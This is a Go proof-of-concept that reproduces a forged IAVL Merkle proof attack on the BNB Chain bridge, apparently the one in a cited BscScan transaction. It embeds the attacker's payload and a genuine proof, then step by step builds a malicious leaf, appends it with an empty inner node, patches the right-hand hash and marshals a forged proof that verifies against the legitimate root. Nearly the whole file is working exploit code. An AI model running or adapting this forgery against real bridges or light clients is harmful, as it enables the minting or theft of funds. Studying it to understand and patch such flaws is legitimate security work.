package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/tendermint/iavl"
	"github.com/tendermint/tendermint/crypto/merkle"
	"github.com/tendermint/tendermint/crypto/tmhash"
)

func removePrefix(input string) string {
	if strings.HasPrefix(input, "0x") {
		input = input[2:]
	}
	return input
}

func mustDecode(str string) []byte {
	if strings.HasPrefix(str, "0x") {
		str = str[2:]
	}
	b, err := hex.DecodeString(str)
	if err != nil {
		panic(err)
	}
	return b
}

func getValueOp(legitProofBytes []byte) iavl.IAVLValueOp {
	var legitProof merkle.Proof
	if err := legitProof.Unmarshal(legitProofBytes); err != nil {
		panic(err)
	}

	legitValueOpIntf, err := iavl.IAVLValueOpDecoder(legitProof.Ops[0])
	if err != nil {
		panic(err)
	}

	return legitValueOpIntf.(iavl.IAVLValueOp)
}

func main() {
	//https://bscscan.com/tx/0x79575ff791606ef2c7d69f430d1fee1c25ef8d56275da94e6ac49c9c4cc5f433
	hackerPayloadOri := "0x000000000000000000000000000000000000000000000000000000000000000000f870a0424e4200000000000000000000000000000000000000000000000000000000009400000000000000000000000000000000000000008ad3c21bcecceda100000094489a8756c18c0b8b24ec2a2b9ff3d4d447f79bec94489a8756c18c0b8b24ec2a2b9ff3d4d447f79bec846553f100"
	validLegitProof := "0x0ab3010a066961766c3a76120e00000100380200000000000000021a980196010a93010a2b0802100318b091c73422200c10f902d266c238a4ca9e26fa9bc36483cd3ebee4e263012f5e7f40c22ee4d20a2b0801100218b091c7342220e4fd47bffd1c06e67edad92b2bf9ca63631978676288a2aa99f95c459436ef631a370a0e0000010038020000000000000002122011056c6919f02d966991c10721684a8d1542e44003f9ffb47032c18995d4ac7f18b091c7340ad4050a0a6d756c746973746f726512036962631ac005be050abb050a110a066f7261636c6512070a0508b891c7340a0f0a046d61696e12070a0508b891c7340a350a08736c617368696e6712290a2708b891c7341220c8ccf341e6e695e7e1cb0ce4bf347eea0cc16947d8b4e934ec400b57c59d6f860a380a0b61746f6d69635f7377617012290a2708b891c734122042d4ecc9468f71a70288a95d46564bfcaf2c9f811051dcc5593dbef152976b010a110a0662726964676512070a0508b891c7340a300a0364657812290a2708b891c73412201773be443c27f61075cecdc050ce22eb4990c54679089e90afdc4e0e88182a230a2f0a02736312290a2708b891c7341220df7a0484b7244f76861b1642cfb7a61d923794bd2e076c8dbd05fc4ee29f3a670a330a06746f6b656e7312290a2708b891c734122064958c2f76fec1fa5d1828296e51264c259fa264f499724795a740f48fc4731b0a320a057374616b6512290a2708b891c734122015d2c302143bdf029d58fe381cc3b54cedf77ecb8834dfc5dc3e1555d68f19ab0a330a06706172616d7312290a2708b891c734122050abddcb7c115123a5a4247613ab39e6ba935a3d4f4b9123c4fedfa0895c040a0a300a0361636312290a2708b891c734122079fb5aecc4a9b87e56231103affa5e515a1bdf3d0366490a73e087980b7f1f260a0e0a0376616c12070a0508b891c7340a300a0369626312290a2708b891c7341220e09159530585455058cf1785f411ea44230f39334e6e0f6a3c54dbf069df2b620a300a03676f7612290a2708b891c7341220db85ddd37470983b14186e975a175dfb0bf301b43de685ced0aef18d28b4e0420a320a05706169727312290a2708b891c7341220a78b556bc9e73d86b4c63ceaf146db71b12ac80e4c10dd0ce6eb09c99b0c7cfe0a360a0974696d655f6c6f636b12290a2708b891c73412204775dbe01d41cab018c21ba5c2af94720e4d7119baf693670e70a40ba2a52143"
	var packageSequence uint64 = 17684867
	var version int64 = 1

	//1. We decode the legit proof, and unmarshall that data, and we can see the it has Ops value which consist of iavl:v type and multistore type
	// for the purpose of this exploit we only needs to focus on the iavl:v type
	decodedLegitProof := mustDecode(validLegitProof)
	var legitProof merkle.Proof
	legitProof.Unmarshal(decodedLegitProof)
	fmt.Printf("\nProof Unmarshal")
	fmt.Printf("\n%+v\n", legitProof)

	//2. Decode the valueOp of iavl:v type, to get the key, and Data, and wrap it with IAVLValueOp
	//https://github.com/cosmos/iavl/blob/v0.12.0/proof_iavl_value.go#L36 (IAVLValueOpDecoder function)
	//https://github.com/cosmos/iavl/blob/v0.12.0/proof_iavl_value.go#L17 (IAVLValueOp struct)
	legitValueOpIntf, _ := iavl.IAVLValueOpDecoder(legitProof.Ops[0])
	valueOp := legitValueOpIntf.(iavl.IAVLValueOp)
	fmt.Printf("\nValue Op")
	fmt.Println("\n", valueOp)

	//3. We can take a look how this proof is constructed
	//https://github.com/cosmos/iavl/blob/v0.12.0/proof_range.go#L13 (RangeProof)
	fmt.Printf("\nProofs")
	fmt.Println("\n", valueOp.Proof)

	//5. Hash the payload to make a new leafNode
	// hackerPayloadHash := tmhash.Sum(mustDecode(hackerPayload))
	hackerPayloadHash := tmhash.Sum(mustDecode(hackerPayloadOri))
	fmt.Printf("\nHash of the malicious payload = %x \n", hackerPayloadHash)

	//6. Make the key for the new malicious leafNode using package sequence
	packageSequenceBytes := make([]byte, 8)
	binary.BigEndian.PutUint64(packageSequenceBytes, packageSequence)
	hackerLeafKey := append(mustDecode("000001003802"), packageSequenceBytes...)
	fmt.Printf("\nMalicious Key = %x\n", hackerLeafKey)

	//7. Putting it all together (Add new leaves with the malicious key, malicious payload hash, and version)
	//https://github.com/cosmos/iavl/blob/v0.12.0/proof.go#L90 (ProofLeafNode struct)
	tempProof := getValueOp(mustDecode(validLegitProof)).Proof.Leaves[0]
	valueOp.Proof.Leaves = append(valueOp.Proof.Leaves, tempProof)
	valueOp.Proof.Leaves[1].Key = hackerLeafKey
	valueOp.Proof.Leaves[1].ValueHash = hackerPayloadHash
	valueOp.Proof.Leaves[1].Version = version
	fmt.Printf("\nAdded Leaves")
	fmt.Println("\n", valueOp.Proof.Leaves)

	//8. Add InnerNodes with empty PathToLeaf struct
	//To satisfy condition on https://github.com/cosmos/iavl/blob/de0740903a67b624d887f9055d4c60175dcfa758/proof_range.go#L223
	valueOp.Proof.InnerNodes = append(valueOp.Proof.InnerNodes, iavl.PathToLeaf{})
	fmt.Printf("\nAdded InnerNodes")
	fmt.Println("\n", valueOp.Proof.InnerNodes)

	//9. Add the hash of the new leafNode to the right attribute of proofInnerNode
	maliciousHash := valueOp.Proof.Leaves[1].Hash()
	valueOp.Proof.LeftPath[1].Right = maliciousHash
	fmt.Printf("\nAdded Right Attribute to the proof")
	fmt.Println("\n", valueOp.Proof.LeftPath)

	//10. Final proof
	fmt.Printf("\nFinal malicious Proof")
	fmt.Println("\n", valueOp.Proof)

	//11.Marshal the malicious proof
	newValueOp := iavl.NewIAVLValueOp(hackerLeafKey, valueOp.Proof)
	newData := newValueOp.ProofOp()
	legitProof.Ops[0].Key = hackerLeafKey
	legitProof.Ops[0].Data = newData.Data
	maliciousProof, _ := legitProof.Marshal()
	fmt.Printf("\nMalicious Proof = 0x%x\n", maliciousProof)

	//VERIFY
	legitProofAgain := getValueOp(decodedLegitProof)
	legitRootHash := legitProofAgain.Proof.ComputeRootHash()
	fmt.Printf("\nLEGIT ROOT HASH = %x\n", legitRootHash)

	evilProofAgain := getValueOp(maliciousProof)
	evilRootHash := evilProofAgain.Proof.ComputeRootHash()
	fmt.Printf("\nEVIL ROOT HASH = %x\n", evilRootHash)

	verifyErr := evilProofAgain.Proof.Verify(legitRootHash)
	fmt.Printf("error computing root hash? %v\n", verifyErr)

	verifyErr = evilProofAgain.Proof.VerifyItem(evilProofAgain.Proof.Leaves[1].Key, mustDecode(hackerPayloadOri))

	fmt.Printf("error verifying proof? %v\n", verifyErr)
}
